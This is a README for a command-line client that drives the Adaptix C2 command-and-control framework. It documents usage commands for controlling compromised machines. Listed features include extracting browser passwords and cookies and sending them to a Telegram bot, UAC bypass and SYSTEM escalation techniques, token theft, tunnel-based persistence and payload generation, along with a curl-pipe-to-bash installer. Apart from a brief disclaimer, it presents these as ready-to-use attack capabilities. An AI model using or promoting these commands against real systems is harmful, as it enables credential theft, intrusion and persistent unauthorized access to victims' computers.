# Whiska

Command-line client for [Adaptix C2 Framework](https://github.com/Adaptix-Framework/AdaptixC2). Full-featured CLI replacement for the Qt GUI client.

> **For authorized security testing and educational use only.**

## Features

- **Authentication**: JWT login, token auto-refresh, OTP-based WebSocket
- **Real-time sync**: WebSocket connection with live updates (agents, tasks, console output)
- **Agent interaction**: Send commands via server-side AxScript parsing
- **Credential harvesting**: Chromium password/cookie extraction with auto ABE key decryption (Chrome 127+), Telegram exfil
- **Privilege escalation**: getsystem (token/task/svc), UAC bypass (runas/cmstp/mockdir/sspi/regshell), potato-dcom, token steal/make, runas
- **Persistence**: OpenSSH + cloudflared tunnel deployment with auto UAC elevation
- **Screen streaming**: PowerShell-based screen capture deployment
- **Payload generation**: Agent beacon payload generation via server API
- **Session management**: List, interact, tag, mark, color, remove agents (bulk remove by age/status)
- **File operations**: Download synced files, upload temp files
- **Services**: List, call, and inspect registered services
- **Subscriptions**: Configurable WebSocket sync categories

## Install

### One-liner install

```bash
curl -fsSL https://github.com/khanhnguyen/whiska/releases/latest/download/install.sh | bash
```

### From source

```bash
git clone <repo_url>
cd whiska
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
python -m whiskacli -H <server> -P <port> -u <username>
```

### Install as package

```bash
pip install -e .
whiska -H <server> -P <port> -u <username>
```

## Usage

```bash
# Basic connection
whiska -H 192.168.1.10 -P 40056 -u operator1

# HTTPS through reverse proxy (port 443)
whiska -H c2.example.com -P 443 -u operator1

# Custom endpoint path
whiska -H c2.example.com -P 443 -e /endpoint -u admin

# Password inline (skip prompt)
whiska -H 192.168.1.10 -P 40056 -u operator1 -p 'password'

# Debug mode (show raw WebSocket packets)
whiska -H 192.168.1.10 -P 40056 -u operator1 --debug
```

## Commands

### Main Menu

| Command | Description |
|---------|-------------|
| `listeners` | List active listeners |
| `agents` / `sessions` | List agent sessions |
| `interact <id>` | Interact with agent (partial ID match) |
| `tasks <agent_id>` | List tasks for an agent |
| `downloads` | List downloaded files |
| `download <file_id>` | Save a file locally |
| `upload <path>` | Upload a temp file |
| `creds` | List credentials |
| `targets` | List targets |
| `tunnels` | List tunnels |
| `screenshots` | List screenshots |
| `chat [message]` | View/send team chat |
| `services` | List registered services |
| `generate` | Generate agent payload |
| `subscribe` | Manage sync subscriptions |
| `remove <id>` | Remove agent (`--older 7d` / `--dead` for bulk) |
| `info <id>` | Show agent details |
| `note <id> <text>` | Set agent note |
| `sleep <id> <sec>` | Set agent sleep interval |
| `jitter <id> <pct>` | Set agent jitter |
| `clear` | Clear screen |
| `exit` | Disconnect and exit |

### Agent Interaction (after `interact`)

| Command | Description |
|---------|-------------|
| `<command>` | Sent to agent via AxScript |
| `info` | Show agent details |
| `tasks` | List agent tasks |
| `task_cancel <id>` | Cancel pending task |
| `task_delete <id>` | Delete task |
| `tag <text>` | Set agent tag |
| `mark <text>` | Set agent mark |
| `color <color>` | Set agent color |
| `upload <path>` | Upload file to agent |
| `download <path>` | Download file from agent |
| `sleep <sec>` | Set sleep interval |
| `jitter <pct>` | Set jitter percentage |
| `commands` | List available agent commands |
| `harvest` | Extract browser credentials + cookies |
| `elevate` | Privilege escalation menu |
| `stream` | Deploy screen streamer |
| `persist ssh` | Deploy OpenSSH + cloudflared persistence |
| `remove` | Remove this agent |
| `history` | Show command history |
| `back` | Return to main menu |

### Harvest

Extracts Chromium-based browser passwords and cookies from the target. Supports Chrome, Edge, CocCoc, Brave, and Avast.

```
harvest                     # Auto-detect and extract all browsers
harvest --abe-key-hex <hex> # Provide ABE key manually (Chrome 127+)
```

The harvest flow:
1. Runs cookie-monster BOF to extract DPAPI master keys
2. Downloads Local State, Login Data, and Cookies databases
3. Auto-detects and decrypts ABE key via IElevator COM BOF (if needed)
4. Decodes all passwords and cookies
5. Sends results to Telegram

### Elevate

Privilege escalation with multiple techniques:

```
elevate getsystem token|task|svc    # Get SYSTEM via token/task/service
elevate uac <method>                # UAC bypass (runas/cmstp/mockdir/sspi/regshell)
elevate potato-dcom                 # Potato DCOM privilege escalation
elevate token steal <pid>           # Steal token from process
elevate token make <user> <pass>    # Create token with credentials
elevate runas <user> <pass> <cmd>   # Run as another user
```

## Architecture

```
CLI (Python)                          Adaptix Server (Go)
┌─────────────┐    HTTPS+JWT         ┌──────────────────┐
│ REST Client ├───────────────────────► REST API         │
│             │                       │                  │
│ WS Client   ◄═══════WSS═══════════►│ WebSocket Broker │
│             │    (JSON packets)     │                  │
│ Interactive │                       │  AxScript Engine │
│ Shell       │    /command/raw ──────►  (parses cmds)  │
└─────────────┘                       └──────────────────┘
```

## Project Structure

```
whiskacli/
├── __init__.py     # Package metadata
├── __main__.py     # Entry point, arg parsing, connection flow
├── client.py       # HTTP + WebSocket client (all API methods)
├── models.py       # Data models + packet type constants
├── cli.py          # Interactive shell (prompt_toolkit + rich)
└── decoder.py      # Chromium credential decoder (v10/v20 + ABE)
```

## Environment Variables

| Variable | Description |
|----------|-------------|
| `WHISKA_TG_TOKEN` | Telegram bot token for harvest exfil |
| `WHISKA_TG_CHAT` | Telegram chat ID for harvest exfil |

## Build

```bash
pip install pyinstaller
pyinstaller whiska.spec
# Output: dist/whiska
```

## License

For authorized use only. See Adaptix C2 Framework license.
